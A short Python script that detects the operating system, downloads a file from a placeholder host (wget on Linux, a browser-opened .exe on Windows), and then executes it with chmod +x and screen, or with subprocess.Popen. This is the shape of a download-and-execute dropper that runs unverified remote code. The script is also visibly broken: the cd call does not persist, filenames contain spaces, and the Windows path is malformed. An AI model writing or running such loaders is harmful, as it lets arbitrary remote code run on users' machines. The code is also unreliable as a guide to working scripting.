import os
import webbrowser
import time
from sys import platform
import subprocess


print("Ur os is:\n "+platform)


if platform == "linux":
    os.system('wget https://the-web.site/file')
elif platform == "win32":
    webbrowser.open('https://the-web.site/file.exe')
    time.sleep(3)

print("Please safe the File in the Desktop if u have a gui")

time.sleep(5)

if platform == "win32":
    subprocess.Popen(['C:\Desktop\\thefile.exe', '-new-tab'])
elif platform == "linux":
    os.system('cd Desktop')
    os.system('chmod +x the file')
    os.system('screen ./the file')
